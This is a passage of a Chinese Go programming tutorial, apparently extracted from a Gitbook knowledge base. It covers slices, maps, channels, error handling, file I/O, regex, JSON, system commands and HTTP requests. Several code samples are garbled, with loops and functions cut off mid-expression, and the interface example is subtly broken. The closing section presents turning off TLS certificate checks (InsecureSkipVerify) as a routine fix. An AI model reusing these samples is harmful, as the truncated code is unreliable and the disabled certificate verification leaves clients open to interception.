fmt.Println(a.name) } // d4m1ts 结构体作为参数 和其他类型一样，只不过类型是结构体罢了 实例： package main import \"fmt\" type testStruct struct { name string age int } func main() { a := testStruct{name: \"d4m1ts\", age: 18} printName(a) } func printName(stru testStruct) { fmt.Println(stru.name) } 结构体指针 也和其他指针一样 实例： package main import \"fmt\" type testStruct struct { name string age int } func main() { a := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(&a) printName(&a) } func printName(stru *testStruct) { fmt.Println(stru.name) } /* &{d4m1ts 18} d4m1ts */ 切片 Go 语言切片是对数组的抽象。 Go 数组的长度不可改变，在特定场景中这样的集合就不太适用，Go 中提供了一种灵活，功能强悍的内置类型切片(\"动态数组\")，与数组相比切片的长度是不固定的，可以追加元素，在追加时可能使切片的容量增大。 定义切片 可以声明一个未指定大小的数组来定义切片，切片不需要说明长度 var identifier []type 或使用 make() 函数来创建切片: var slice1 []type = make([]type, len) // 也可以简写为 slice1 := make([]type, len) 也可以指定容量，其中 capacity 为可选参数。 make([]T, length, capacity) 这里 len 是数组的长度并且也是切片的初始长度。 实例： package main import \"fmt\" func main() { var slice1 []int fmt.Println(slice1) // [] var slice2 []int = make([]int, 10) fmt.Println(slice2) // [0 0 0 0 0 0 0 0 0 0] } 初始化切片 package main import \"fmt\" func main() { s1 := []int {1,2,3,4,5} fmt.Println(s1) // [1 2 3 4 5] // 使用数组来初始化切片 d1 := [10]int {1,3,5,7,9} fmt.Println(d1) // [1 3 5 7 9 0 0 0 0 0] s2 := d1[:] fmt.Println(s2) // [1 3 5 7 9 0 0 0 0 0] s3 := d1[2:] fmt.Println(s3) // [5 7 9 0 0 0 0 0] } 空(nil)切片 一个切片在未初始化之前默认为 nil，长度为 0 package main import \"fmt\" func main() { var s1 []int fmt.Println(s1) // [] fmt.Println(s1 == nil) // true } 切片截取 和python一样，array[start:end]截取即可 package main import \"fmt\" func main() { var s1 = []int {1,2,3,4,5} fmt.Println(s1[2:4]) // [3 4] } len()和cap()函数 切片是可索引的，并且可以由len()方法获取长度。 切片提供了计算容量的方法cap()可以测量切片最长可以达到多少。 package main import \"fmt\" func main() { s1 := []int {1,2,3,4,5} fmt.Println(len(s1)) // 5 fmt.Println(cap(s1)) // 5 } 追加元素 通过append函数可以追加元素 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} c = append(c, \"dd\", \"ee\") fmt.Println(c) // [aa bb cc dd ee] } 如果想合并2个切片，也可以使用append 注意的是要添加...，如果没有 ...，它就会由于类型错误而无法编译 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} c = append(c, \"dd\", \"ee\") x := [] string {\"1\",\"2\",\"3\"} c = append(c, x...) fmt.Println(c) // [aa bb cc dd ee 1 2 3] } append()和copy()函数 如果想增加切片的容量，我们必须创建一个新的更大的切片并把原分片的内容都拷贝过来。 下面的代码描述了从拷贝切片的 copy 方法和向切片追加新元素的 append 方法。 package main import \"fmt\" func main() { var s1 = []int {1,2,3,4,5} s1 = append(s1, 666) // [1 2 3 4 5 666] s1 = append(s1, 7,8,9) // [1 2 3 4 5 666 7 8 9] fmt.Println(s1) s2 := make([]int, len(s1)*2, cap(s1)*2) copy(s2, s1) // 把s1的内容复制给s2 fmt.Println(s2) // [1 2 3 4 5 666 7 8 9 0 0 0 0 0 0 0 0 0] } 集合(Map) Map 是一种无序的键值对的集合。Map 最重要的一点是通过 key 来快速检索数据，key 类似于索引，指向数据的值。 Map 是一种集合，所以我们可以像迭代数组和切片那样迭代它。不过，Map 是无序的，我们无法决定它的返回顺序，这是因为 Map 是使用 hash 表来实现的。 定义Map 可以使用内建函数 make 也可以使用 map 关键字来定义 Map: /* 声明变量，默认 map 是 nil */ var map_variable map[key_data_type]value_data_type /* 使用 make 函数 */ map_variable := make(map[key_data_type]value_data_type) 实例： package main import \"fmt\" func main() { // 1.直接使用map创建 m1 := map[string]string{ \"a\": \"test1\", \"b\": \"test2\", } m1 [\"c\"] = \"test3\" fmt.Println(m1) // 2.使用make创建 m2 := make(map[string]string) m2 [\"e\"] = \"f\" fmt.Println(m2) } 删除元素 delete()函数用于删除集合的元素, 参数为map和其对应的key package main import \"fmt\" func main() { // 1.直接使用map创建 m1 := map[string]string{ \"a\": \"test1\", \"b\": \"test2\", } m1 [\"c\"] = \"test3\" delete(m1, \"a\") fmt.Println(m1) // map[b:test2 c:test3] } 范围(Range) range 关键字用于 for 循环中迭代数组(array)、切片(slice)、通道(channel)或集合(map)的元素。在数组和切片中它返回元素的索引和索引对应的值，在集合中返回 key-value 对 package main import \"fmt\" func main() { // 遍历切片 var s1 = []int {1,2,3,4,5} sum := 0 for _,num := range s1 { // _空白符，表示被舍弃的变量，这里的变量是索引 sum += num } fmt.Println(sum) // 遍历map m1 := map[string]string{ \"a\":\"test1\", \"b\":\"test2\", } for k,v := range m1 { fmt.Println(k, v) } } 类型转换 类型转换用于将一种数据类型的变量转换为另外一种类型的变量 语法： type_name为类型，expression为表达式 type_name(expression) 实例： package main import \"fmt\" func main() { a := 1 fmt.Println(string(a)) // 空 fmt.Println(float32(a)) // 1 } 递归 递归，就是在运行的过程中调用自己 阶乘实例 package main import \"fmt\" func Factorial(n uint64)(result uint64) { if (n > 0) { result = n * Factorial(n-1) return result } return 1 } func main() { var i int = 15 fmt.Printf(\"%d 的阶乘是 %d\\n\", i, Factorial(uint64(i))) } // 15 的阶乘是 1307674368000 斐波那契数列实例 package main import \"fmt\" func fibonacci(n int) int { if n 接口 Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口 和其他语言如java的接口一样 声明接口 type interface_name interface { method_name1([args ...arg_type]) [return_type] method_name2([args ...arg_type]) [return_type] method_name3([args ...arg_type]) [return_type] ... method_namen([args ...arg_type]) [return_type] } 一个接口中可以定义多个方法，根据逻辑需要，自定义参数和返回值。 实现接口 一个结构体实现了某个接口的所有方法，则此结构体就实现了该接口。 实例： package main import \"fmt\" // 定义接口 type testImpl interface { testFunc1(a int, b int) } // 定义结构体 type testStruct struct { } // 实现函数 func (testMethod testStruct) TestFunc1(a int, b int) int { return a+b } // 调用函数 func main() { test := testStruct{} // 实例化方法1 res := test.TestFunc1(10,20) fmt.Println(res) test1 := new(testStruct) // 实例化方法2 res1 := test1.TestFunc1(10,20) fmt.Println(res1) } new和make Go提供了两种分配原语，即内建函数 new 和 make。 它们所做的事情不同，所应用的类型也不同。它们可能会引起混淆，但规则却很简单。 new 这是个用来分配内存的内建函数，但与其它语言中的同名函数不同，它不会初始化内存，只会将内存置零。也就是说，new(T) 会为类型为 T 的新项分配已置零的内存空间，并返回它的地址，也就是一个类型为 *T 的值。 它返回一个指针，该指针指向新分配的，类型为T的零值 实例： package main import ( \"fmt\" ) func main() { type test struct { a int b int } p := new(test) fmt.Println(p) // &{0 0} fmt.Println(*p) // {0 0} } make 内建函数 make(T, args) 的目的不同于 new(T)，它只用于创建切片、映射和信道，并返回类型为 T（而非 *T）的一个已初始化（而非置零）的值。 注意：make只适用于映射、切片和信道且不返回指针。若要获得明确的指针，请使用new分配内存。 defer defer 语句用于预设一个函数调用（即推迟执行函数）， 该函数会在执行 defer 的函数返回之前立即执行。它显得非比寻常， 但却是处理一些事情的有效方式，例如无论以何种路径返回，都必须释放资源的函数。 典型的例子就是解锁互斥和关闭文件。 被推迟函数的实参（如果该函数为方法则还包括接收者）在推迟执行时就会求值， 而不是在调用执行时才求值。这样不仅无需担心变量值在函数执行时被改变， 同时还意味着单个已推迟的调用可推迟多个函数的执行。 实例： 被推迟的函数按照后进先出（LIFO）的顺序执行，因此以上代码在函数返回时会打印 4 3 2 1 0 package main import ( \"fmt\" ) func main() { for i := 0; i 并发 go程 称之为Go程是因为现有的术语—线程、协程、进程等等—无法准确传达它的含义。 Go程具有简单的模型：它是与其它Go程并发运行在同一地址空间的函数。它是轻量级的，所有消耗几乎就只有栈空间的分配；而且栈最开始是非常小的，所以它们很廉价，仅在需要时才会随着堆空间的分配（和释放）而变化。 Go语言支持并发，我们只需要通过 go 关键字来开启 goroutine 即可。 goroutine 是轻量级线程，goroutine 的调度是由 Golang 运行时进行管理的。 语法： go 函数名( 参数列表 ) Go 允许使用 go 语句开启一个新的运行期线程， 即 goroutine，以一个不同的、新创建的 goroutine 来执行一个函数。 同一个程序中的所有 goroutine 共享同一个地址空间 实例： package main import ( \"fmt\" \"time\" ) func loop() { i := 1 for i 执行代码后，输出结果为1 1 1 2 2 2 3 3 3 ...，因为是3个goroutine在同时执行 通道（channel） 通道（channel，也叫信道）是用来传递数据的一个数据结构。 主要是获取并发的每个函数返回的数据 通道可用于两个 goroutine 之间通过传递一个指定类型的值来同步运行和通讯。操作符 用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。 ch 声明一个通使用chan关键字即可，通道在使用前必须先创建： ch := make(chan int) 实例： package main import \"fmt\" // 计算和 func loop(res chan int) { i := 1 sum := 0 for i 通道缓冲区 通道可以设置缓冲区，通过 make 的第二个参数指定缓冲区大小 ch := make(chan int, 100) 带缓冲区的通道允许发送端的数据发送和接收端的数据获取处于异步状态，就是说发送端发送的数据可以放在缓冲区里面，可以等待接收端去获取数据，而不是立刻需要接收端去获取数据。 不过由于缓冲区的大小是有限的，所以还是必须有接收端来接收数据的，否则缓冲区一满，数据发送端就无法再发送数据了。 注意：如果通道不带缓冲，发送方会阻塞直到接收方从通道中接收了值。如果通道带缓冲，发送方则会阻塞直到发送的值被拷贝到缓冲区内；如果缓冲区已满，则意味着需要等待直到某个接收方获取到一个值。接收方在有值可以接收之前会一直阻塞。 实例： package main import \"fmt\" // 计算所有通道的和 func loop(res chan int) { i := 1 for i 注意事项 接收者在收到数据前会一直阻塞。若信道是不带缓冲的，那么在接收者收到值前，发送者会一直阻塞；若信道是带缓冲的，则发送者仅在值被复制到缓冲区前阻塞；若缓冲区已满，发送者会一直等待直到某个接收者取出一个值为止。 遍历通道 通过 range 关键字来实现遍历读取到的数据，类似于与数组或切片 实例： package main import \"fmt\" func loop(res chan int) { i := 1 for i 关闭通道 如果通道接收不到数据后 ok 就为 false，这时通道就可以使用 close() 函数来关闭 package main import \"fmt\" func loop(res chan int) { i := 1 for i 异常处理 在异常处理方面，Go语言不像其他语言，使用try..catch.. finall...， 而使用defer, panic, recover，将异常和控制流程区分开。即通过panic抛出异常，然后在defer中，通过recover捕获这个异常，最后处理。 但是更加推荐的错误处理方法： Golang中我们通常会在函数或方法中返回**error**结构对象来判断是否有异常出现，并且可以更具需要自定义各种类型的error。如果返回的 error 值为 nil，则表示未遇到错误，否则 error 会返回一个字符串，用于说明遇到了什么错误。 error类型是一个接口类型，自定义的错误类型必须实现Error()方法，这是它的定义： type error interface { Error() string } 生成error 1、原生New方法，将字符串 text 包装成一个 error 对象返回 func New(text string) error { return &errorString{text} } //例如 errorIns := errors.New(\"test content\") fmt.Println(errorIns) 2、定义自己的错误 package main import ( \"fmt\" \"time\" ) // 定义结构体 type MyError struct { When time.Time What string } // 实现error接口中的方法 func (e MyError) Error() string { return fmt.Sprintf(\"%v: %v\", e.When, e.What) } // 编写异常函数 func oops() error { return MyError{ time.Date(1989, 3, 15, 22, 30, 0, 0, time.UTC), \"the file system has gone away\", } } func main() { if err := oops(); err != nil { fmt.Println(err) } } Panic异常 向调用者报告错误的一般方式就是将 error 作为额外的值返回；但是这种情况下程序不会退出，如果我们遇到了出现异常就必须停止程序的情况，就会使用到panic Go提供了内建的 panic 函数 它会产生一个运行时错误并终止程序 该函数接受一个任意类型的实参（一般为字符串），并在程序终止时打印 它还能表明发生了意料之外的事情，比如从无限循环中退出了package main import \"fmt\" func main() { panic(\"sth error !!!\") fmt.Println(\"hello world\") } /* panic: sth error !!! goroutine 1 [running]: main.main() /Users/d4m1ts/go/src/goTest/Hello.go:6 +0x39 */ 因为会直接停止整个程序，所以实际的库函数应避免 panic，若问题可以被屏蔽或解决， 最好就是让程序继续运行而不是终止整个程序恢复 当 panic 被调用后（包括不明确的运行时错误，例如切片检索越界或类型断言失败）， 程序将立刻终止当前函数的执行，并开始回溯Go程的栈，运行任何被推迟（defer）的函数。 若回溯到达Go程栈的顶端，程序就会终止。不过我们可以用内建的 recover 函数来重新或来取回Go程的控制权限并使其恢复正常执行。 实例：package main import ( \"fmt\" \"time\" ) func loop(a int){ defer func() { // 触发panic异常就会调用这个推迟函数 if err := recover(); err != nil { // recover函数恢复 fmt.Println(\"loop error: \", err) } }() if a > 3{ panic(\"erro a > 3\") } else { fmt.Println(\"normal: \", a) } } func main() { i := 0 for i 3 normal: 3 */ 通过恰当地使用恢复模式，do 函数（及其调用的任何代码）可通过调用 panic 来避免更坏的结果。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 17:48:00 "},"知识库/04.编程开发/01.GO/02.GO实例/01.GO常用基础实例.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/01.GO常用基础实例.html","title":"01.GO常用基础实例","keywords":"","body":"介绍 记录一些可能常用到的实例，便于快速查询 读文件 按字节读取文件 这种方式是以字节为单位来读取，相对底层一些，代码量也较大 package main import ( \"fmt\" \"io\" \"os\" ) func main() { file,_ := os.Open(\"test.txt\") defer file.Close() buf := make([]byte, 1024) // 每次读取1024字节 var res string // 存放最终的结果 for { count, err := file.Read(buf) if err == io.EOF { // 检测是否到结尾 break } else { currBytes := buf[:count] // 读取了count字节 res += string(currBytes) // 最终结果 } } fmt.Println(res) } 借助ioutil来读取 由于 os.File 也是 io.Reader 的实现，我们可以调用 ioutil.ReadAll(io.Reader) 方法，将文件所有字节读取出来，省去了使用字节缓存循环读取的过程。 package main import ( \"fmt\" \"io/ioutil\" \"os\" ) func main() { file,_ := os.Open(\"test.txt\") defer file.Close() byteRes, _ := ioutil.ReadAll(file) // 返回存放结果的切片 fmt.Printf(\"%T\\n\", byteRes) // []uint8 fmt.Println(string(byteRes)) } 仅使用ioutil包来完成读取操作 为了进一步简化文件读取操作，ioutil 还提供了 ioutil.ReadFile(filename string) 方法，一行代码搞定读取任务 package main import ( \"fmt\" \"io/ioutil\" ) func main() { data, _ := ioutil.ReadFile(\"test.txt\") fmt.Println(string(data)) } 利用Scanner按行读取 逐行读取文件内容，这个时候可以 Scanner 来完成 package main import ( \"bufio\" \"fmt\" \"os\" ) func main() { file, _ := os.Open(\"test.txt\") defer file.Close() scanner := bufio.NewScanner(file) // 类似Java中的Scanner for scanner.Scan() { fmt.Println(scanner.Text()) } } 写文件 使用ioutil 刚才用到了ioutil.ReadFile，与之对应的，肯定也有WriteFile 该函数属于全覆盖写入，如果文件不存在，则会根据指定的权限创建文件，如果存在，则会先清空文件原有内容，然后再写入新数据 package main import ( \"fmt\" \"io/ioutil\" \"os\" ) func main() { data := []byte(\"hello d4m1ts\") fmt.Println(os.FileMode(0666).String()) // -rw-rw-rw- ioutil.WriteFile(\"test.txt\", data, 0666) } 通过File句柄 os.OpenFile(name string, flag int, perm FileMode)方法，通过指定额外的 读写方式 和 文件权限 参数，使文件操作变得更为灵活。 flag 有以下几种常用的值： os.O_CREATE: create if none exists 不存在则创建 os.O_RDONLY: read-only 只读 os.O_WRONLY: write-only 只写 os.O_RDWR: read-write 可读可写 os.O_TRUNC: truncate when opened 文件长度截为0：即清空文件 os.O_APPEND: append 追加新数据到文件package main import ( \"fmt\" \"os\" ) func main() { file,_ := os.OpenFile(\"test.txt\", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0666) // 按照特定权限打开 defer file.Close() data := []byte(\"hello d4m1ts\") count, _ := file.Write(data) // 按字节写入，返回的count为写入的字节数 fmt.Println(count) count, _ = file.WriteString(\"\\nHello D4m1ts\") // 按字符串写入 fmt.Println(count) file.Sync() // 确保写入到磁盘 } 通过bufio包 这种方式其实是在File句柄上做了一层封装，调用方式和上面直接写入非常相似package main import ( \"bufio\" \"fmt\" \"os\" ) func main() { file,_ := os.OpenFile(\"test.txt\", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0666) defer file.Close() writer := bufio.NewWriter(file) data := []byte(\"hello d4m1ts\") count, _ := writer.Write(data) // 按字节写入，返回的count为写入的字节数 fmt.Println(count) count, _ = writer.WriteString(\"\\nHello D4m1ts\") // 按字符串写入 fmt.Println(count) writer.Flush() // 清空缓存，确保写入到磁盘 } 正则表达式 匹配内容是否存在 package main import ( \"fmt\" \"regexp\" ) func main() { regex := \"\\\\d{1,3}\" res, _ := regexp.MatchString(regex, \"123123\") res1, _ := regexp.MatchString(regex, \"aaaa\") fmt.Println(res) // true fmt.Println(res1) // false } 提取内容 package main import ( \"fmt\" \"regexp\" ) func main() { regex, _ := regexp.Compile(\"(\\\\d{1,3})\\\\d{1,3}\") // 编译正则表达式 fmt.Println(regex.MatchString(\"123123123123\")) // true fmt.Println(regex.FindString(\"123213123123\")) // 123213 返回第一个匹配的 fmt.Println(regex.FindStringIndex(\"123213123123\")) // [0 6] 返回第一个匹配的开始和结尾的索引 fmt.Println(regex.FindStringSubmatch(\"123213123123\")) // [123213 123] 返回包括()这种子匹配的 fmt.Println(regex.FindAllString(\"123213123123\",-1)) // [123213 123123] 返回匹配的所有内容，n表示为返回个数，-1则返回全部 fmt.Println(regex.FindAllStringSubmatch(\"123213123123\",-1)) // [[123213 123] [123123 123]] 同时返回子匹配的结果 fmt.Println(regex.FindAll([]byte(\"123123123123\"), -1)) // [[49 50 51 49 50 51] [49 50 51 49 50 51]] 通过字节去匹配，返回的也是字节的结果 } 替换内容 package main import ( \"fmt\" \"regexp\" ) func main() { regex, _ := regexp.Compile(\"(\\\\d{1,3})\\\\d{1,3}\") // 编译正则表达式 fmt.Println(regex.ReplaceAllString(\"123123123213\",\"a\")) // aa } 其他 在线正则表达式测试网站：https://regex101.com/ golang正则匹配的时候，.默认是不匹配换行的，所以要匹配多行数据就容易出问题 这个时候可以采用如下格式，让.也可以匹配换行(?s).* 实例： JSON序列化和反序列化 标准JSON模块 Go 语言标准库 encoding/json 提供了操作 JSON 的方法，一般可以使用 json.Marshal 和 json.Unmarshal 来序列化和解析 JSON 字符串 实例一： package main import ( \"encoding/json\" \"fmt\" ) func main() { // 序列化 s1 := []string{\"apple\", \"peach\", \"pear\"} s2, _ := json.Marshal(s1) // 转字符串 fmt.Println(string(s2)) // [\"apple\",\"peach\",\"pear\"] // 反序列化 var s3 [] string json.Unmarshal([]byte(s2), &s3) // 字符串恢复 fmt.Println(s3) // [apple peach pear] fmt.Println(len(s3), s3[0]) // 3 apple } 实例二： package main import ( \"encoding/json\" \"fmt\" ) // 定义结构体，变量名注意大写，因为跨到json包了 type User struct { Name string Age int } func main() { // 初始化结构体 user := User{ Name: \"d4m1ts\", Age: 18, } // 序列化，转字符串 s1, _ := json.Marshal(user) fmt.Println(string(s1)) // 反序列化，恢复为原来的结构 user2 := User{} json.Unmarshal(s1, &user2) fmt.Println(user2) } 更优的jsoniter 标准库 encoding/json 在使用时需要预先定义结构体，使用时显得不够灵活。这时候可以尝试使用 github.com/json-iterator/go 模块，其除了提供与标准库一样的接口之外，还提供了一系列更加灵活的操作方法。 go get -v github.com/json-iterator/go package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" ) func main() { // 反序列化，恢复为原来的结构 s := `{\"a\":\"b\", \"c\":[\"d\",\"e\",\"f\"]}` res := jsoniter.Get([]byte(s), \"c\") fmt.Println(res.ToString()) // [\"d\",\"e\",\"f\"] 只解析\"c\"的内容部分 } 扩展 大多数时候获取的json数据可能是映射+切片形式的，只有上面的一些内容很难搞，所以还是补充一下 使用.GetInterface()会自动给结果转换为interface{}，再通过这个结果继续转换，如[]interface{} 想要拿到最后的数据，只需要通过数据.(对应的格式)即可，如 aaa.(string)表示转换为string [!note] 一步一步看吧，用.GetInterface()或者等报错提示，就可以看到应该转换的格式了，如下图右边就是可以转换的格式 func main() { strings := \"{\\\"a\\\":[{\\\"b\\\":\\\"c\\\"}]}\" var res interface{} res = jsoniter.Get([]byte(strings), \"a\").GetInterface() fmt.Println(res.([]interface{})) for _,i := range res.([]interface{}) { fmt.Println(i.(map[string]interface{})) } } 时间日期 package main import ( \"fmt\" \"time\" ) func main() { p := fmt.Println // 现在的时间 now := time.Now() p(now) // 休眠1秒 time.Sleep(time.Second * 1) p(time.Now()) // 现在的时间 // 格式类型转换 t1, _ := time.Parse(time.RFC3339, \"2012-11-01T22:08:41+00:00\") p(t1) // 2012-11-01 22:08:41 +0000 +0000 // 格式化输出 p(now.Format(\"3:04PM\")) // 5:14PM p(now.Format(\"Mon Jan _2 15:04:05 2006\")) // Tue Dec 28 17:15:49 2021 p(now.Format(\"2006-01-02T15:04:05.999999-07:00\")) // 2021-12-28T17:15:49.121777+08:00 p(now.Format(time.RFC850)) // Tuesday, 28-Dec-21 17:20:02 CST fmt.Printf(\"%d-%02d-%02dT%02d:%02d:%02d-00:00\\n\", now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second()) // 2021-12-28T17:20:02-00:00 } 随机数 伪随机数 Go的math/rand包提供伪随机数生成。例如，rand.Intn返回一个随机int n，0 。 伪随机生成的数字是确定的，不论在什么机器、什么时间，只要执行的随机代码一样，那么生成的随机数就一样 package main import ( \"fmt\" \"math/rand\" ) func main() { p := fmt.Println p(rand.Int()) // 5577006791947779410 p(rand.Int31n(int32(60))) // 27 for i:=0; i 真随机数 crypto/rand是为了提供更好的随机性满足密码对随机数的要求，在linux上已经有一个实现就是/dev/urandom，crypto/rand就是从这个地方读“真随机”数字返回，但性能比较慢 package main import ( \"crypto/rand\" \"math/big\" ) func main() { for i := 0; i URL解析 可以直接使用url.Parse(string u)来解析，其中包括方案，身份验证信息，主机，端口，路径，查询参数和查询片段等信息 package main import ( \"fmt\" \"net/url\" ) func main() { u := \"https://admin:password@blog.gm7.org/test/point?a=123&b=test\" uu, _ := url.Parse(u) fmt.Println(uu.Scheme) fmt.Println(uu.User) fmt.Println(uu.User.Username()) fmt.Println(uu.Host) fmt.Println(uu.Path) fmt.Println(uu.Hostname()) fmt.Println(uu.Query()) } /* https admin:password admin blog.gm7.org /test/point blog.gm7.org map[a:[123] b:[test]] */ Base64 package main import ( \"encoding/base64\" \"fmt\" ) func main() { a := \"123456\" res := base64.StdEncoding.EncodeToString([] byte(a)) fmt.Println(res) // MTIzNDU2 decod, _ := base64.StdEncoding.DecodeString(res) fmt.Println(string(decod)) // 123456 } 命令行参数 从命令行获取参数，得到的是一个切片 package main import ( \"fmt\" \"os\" ) func main() { args := os.Args fmt.Println(args) } /* go run Hello.go 123 456 [/var/folders/fw/tddtsjp91wb9q64l5xt7jd540000gn/T/go-build3185553057/b001/exe/Hello 123 456] */ 执行系统命令 在 Golang 中用于执行命令的库是 os/exec，exec.Command 函数返回一个 Cmd 对象，根据不同的需求，可以将命令的执行分为三种情况 只执行命令，不获取结果 执行命令，并获取结果（不区分 stdout 和 stderr） 执行命令，并获取结果（区分 stdout 和 stderr） 只执行命令，不获取结果 直接调用Run()函数 package main import ( \"fmt\" \"os/exec\" ) func main() { res := exec.Command(\"open\", \"-na\", \"Calculator\").Run() // run会阻塞等到命令执行结束 fmt.Println(res) // } 执行命令获取结果 可以调用 cmd 的 CombinedOutput 函数 package main import ( \"fmt\" \"os/exec\" ) func main() { cmd := exec.Command(\"ls\", \"-la\") res, _ := cmd.CombinedOutput() fmt.Println(string(res)) // ls -la 执行结果 } 执行命令获取结果并区分stdout和stderr package main import ( \"bytes\" \"fmt\" \"os/exec\" ) func main() { cmd := exec.Command(\"ls\", \"-la\") var stdout, stderr bytes.Buffer cmd.Stdout = &stdout cmd.Stderr = &stderr cmd.Run() fmt.Println(string(stdout.Bytes())) // ls -la 执行结果 } 多条命令使用管道执行 就是类似shell里面|的作用，ls -la | grep go package main import ( \"fmt\" \"os\" \"os/exec\" ) func main() { cmd1 := exec.Command(\"ls\", \"-la\") cmd2 := exec.Command(\"grep\", \"go\") cmd2.Stdin, _ = cmd1.StdoutPipe() cmd2.Stdout = os.Stdout cmd2.Start() cmd1.Run() cmd2.Wait() fmt.Println(cmd2.Stdout) // ls -la | grep go 执行结果 } 扩展 前面每个空格间都需要单独一个参数，有时候很长就不方便，可以采用如下的方式来 cmd := exec.Command(\"/bin/sh\",\"-c\",\"expr 2 + 33\") HTTP请求 快速发起get请求 package main import ( \"fmt\" \"io/ioutil\" \"net/http\" ) func main() { url := \"https://www.baidu.com/\" response,_ := http.Get(url) // 发起get请求 defer response.Body.Close() fmt.Println(response.StatusCode) fmt.Println(response.Header.Get(\"Server\")) body, _ := ioutil.ReadAll(response.Body) fmt.Println(string(body)) // 源码 } 收到的数据包 GET / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip 带有参数的GET请求 可以直接在上面的url后面直接构造参数，也可以通过如下的方式手动设置参数 package main import ( \"fmt\" \"net/http\" \"net/url\" ) func main() { u := \"http://baidu.com/\" Url, _ := url.Parse(u) param := url.Values{} param.Set(\"name\", \"d4m1ts\") param.Set(\"中文\", \"汉字测试\") Url.RawQuery = param.Encode() // 包含URL编码 fmt.Println(Url) // http://baidu.com/?name=d4m1ts&%E4%B8%AD%E6%96%87=%E6%B1%89%E5%AD%97%E6%B5%8B%E8%AF%95 resp,_ := http.Get(Url.String()) fmt.Println(resp.StatusCode) // 200 } 收到的数据包 GET /?name=d4m1ts&%E4%B8%AD%E6%96%87=%E6%B1%89%E5%AD%97%E6%B5%8B%E8%AF%95 HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip 返回JSON的数据包 返回是json格式，如何快速格式化数据 返回的json内容 { \"args\": {}, \"headers\": { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Dnt\": \"1\", \"Host\": \"httpbin.org\", \"Sec-Gpc\": \"1\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\", \"X-Amzn-Trace-Id\": \"Root=1-61cbb6de-6e8a5d6a2710be6f22da6f92\" }, \"origin\": \"213.239.21.35\", \"url\": \"http://httpbin.org/get\" } 一样的发起http请求，只是最后用JSON来反序列化而已 package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" \"io/ioutil\" \"net/http\" ) func main() { u := \"http://httpbin.org/get\" resp, err := http.Get(u) if err == nil { // 请求成功 body, _ := ioutil.ReadAll(resp.Body) origin := jsoniter.Get(body, \"origin\") fmt.Println(origin.ToString()) // 213.239.21.35 headers := jsoniter.Get(body, \"headers\") fmt.Println(headers.Get(\"Host\").ToString()) // httpbin.org } } 自定义Header头 package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" \"io/ioutil\" \"net/http\" \"time\" ) func main() { // 创建一个HTTP请求，但是不发送请求 u := \"http://httpbin.org/get\" req, _ := http.NewRequest(\"GET\", u, nil) req.Header.Set(\"User-Agent\", \"Test GO\") req.Header.Set(\"Name\", \"d4m1ts\") // 发送刚才创建的请求 client := http.Client{ Timeout: 3*time.Second, // 超时时间 } resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) headers := jsoniter.Get(body, \"headers\") fmt.Println(headers.ToString()) } /* { \"Accept-Encoding\": \"gzip\", \"Host\": \"httpbin.org\", \"Name\": \"d4m1ts\", \"User-Agent\": \"Test GO\", \"X-Amzn-Trace-Id\": \"Root=1-61cbbb0d-68f21a6c5c36abd861b6fe99\" } */ 收到的数据包 GET / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Test GO Name: d4m1ts Accept-Encoding: gzip 快速发起POST请求 方法一：使用http.Post，有一点点麻烦 package main import ( \"net/http\" \"strings\" ) func main() { u := \"http://127.0.0.1:8000\" http.Post(u, \"application/x-www-form-urlencoded\", strings.NewReader(\"aa=bb\")) } 收到的http请求 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Content-Length: 5 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip aa=bb 方法二：使用http.PostForm，相对简单，但是无法设置content-type，没那么自由 package main import ( \"net/http\" \"net/url\" ) func main() { u := \"http://127.0.0.1:8000\" param := url.Values{} param.Set(\"aaa\", \"bbb\") http.PostForm(u, param) } 收到的http请求 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Content-Length: 7 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip aaa=bbb 自定义POST请求 和get差不多，只不过是多了设置content-type和post数据的步骤而已 举例为发送json数据 package main import ( \"bytes\" \"encoding/json\" \"net/http\" ) func main() { // 创建请求，但是不发起 u := \"http://127.0.0.1:8000\" param := map[string]string{ \"aa\": \"bb\", \"name\": \"d4m1ts\", } buf, _ := json.Marshal(param) // 序列化的json req, _ := http.NewRequest(\"POST\", u, bytes.NewReader(buf)) req.Header.Set(\"User-Agent\", \"UA TEST\") req.Header.Set(\"Content-Type\", \"application/json\") // 发送刚才的请求 client := http.Client{} client.Do(req) } 收到的http数据包 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: UA TEST Content-Length: 27 Content-Type: application/json Accept-Encoding: gzip {\"aa\":\"bb\",\"name\":\"d4m1ts\"} 忽略证书 有些时候一些ssl网站因为证书问题也会抛出panic异常，所以一般可以忽略SSL证书，在初始化http客户端的时候忽略，代码如下 tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client := http.Client{ Transport: tr, 